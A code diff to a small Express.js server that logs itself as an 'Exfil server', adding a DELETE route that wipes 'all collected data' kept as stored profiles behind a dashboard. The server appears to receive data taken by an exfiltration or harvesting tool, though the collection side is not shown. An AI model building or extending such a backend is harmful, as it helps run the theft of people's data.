@@ -111,6 +111,14 @@ app.get("/profiles", (_, res) => {
     res.json(out);
 });
 
+// DELETE /profiles — wipe all collected data
+app.delete("/profiles", (_, res) => {
+    profiles.clear();
+    saveProfiles();
+    console.log("[!] All profiles cleared via dashboard");
+    res.json({ ok: true });
+});
+
 app.listen(PORT, () => {
     console.log(`[*] Exfil server listening on http://localhost:${PORT}`);
     console.log(`[*] Dashboard: http://localhost:${PORT}/`);
